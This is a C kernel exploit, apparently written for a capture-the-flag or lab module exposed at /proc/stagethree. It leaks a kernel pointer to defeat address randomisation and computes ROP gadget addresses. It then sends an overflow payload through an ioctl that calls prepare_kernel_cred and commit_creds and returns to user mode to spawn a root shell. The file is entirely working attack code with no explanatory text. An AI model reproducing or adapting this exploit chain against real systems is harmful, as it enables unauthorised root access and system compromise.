#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);

size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
size_t prepare_kernel_cred, commit_creds;

void shell() {
    puts("[*] Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        perror("execve failed"); // If execve fails, print error
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
}

void prepare_tf() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    user_rip = (size_t)shell;
    puts("[+] Saved state");
}

int main(){
  signal(SIGSEGV, shell);
  prepare_tf();
  int fd, check_kbase, i, size = 0x200;
  size_t kbase, raw_leak, leaking_kbase[size];

  fd = open("/proc/stagethree", O_RDWR);
  check_kbase = read(fd, leaking_kbase, size);
  for(int i = 0; i < size; i++){
    printf("%d - 0x%016lx\n", i, leaking_kbase[i]);
  }

  raw_leak = leaking_kbase[9];
  kernel_base = raw_leak - 0x228274;
  commit_creds = KADDR(0xffffffff8107e8b0);
  prepare_kernel_cred = KADDR(0xffffffff8107ecb0);

  size_t pop_rdi, pop_rsi, pop_rcx, mov_rdi_rax, swapgs_popfq, iretq;
  pop_rdi = KADDR(0xffffffff81001108);
  pop_rsi = KADDR(0xffffffff810017f8);
  pop_rcx = KADDR(0xffffffff8106404f);
  mov_rdi_rax = KADDR(0xffffffff8138dd36);
  swapgs_popfq = KADDR(0xffffffff81c00f0a);
  iretq = KADDR(0xffffffff8101646e);

  printf("[+] Raw leak: %p\n", raw_leak);
  printf("[+] kernel base: %p\n", kernel_base);
  printf("[+] commit_creds: %p\n", commit_creds);
  printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);

  size_t fuzz[100] = {0};
  i = 33;
  fuzz[i++] = pop_rdi;
  fuzz[i++] = 0;
  fuzz[i++] = prepare_kernel_cred;
  fuzz[i++] = pop_rcx;
  fuzz[i++] = 1;
  fuzz[i++] = pop_rsi;
  fuzz[i++] = 20;
  fuzz[i++] = mov_rdi_rax;
  fuzz[i++] = commit_creds;
  fuzz[i++] = swapgs_popfq;
  fuzz[i++] = 0;
  fuzz[i++] = iretq;
  fuzz[i++] = user_rip;
  fuzz[i++] = user_cs;
  fuzz[i++] = user_rflags;
  fuzz[i++] = user_sp;
  fuzz[i++] = user_ss;
  ioctl(fd, 0x7789, fuzz);
  close(fd);
}
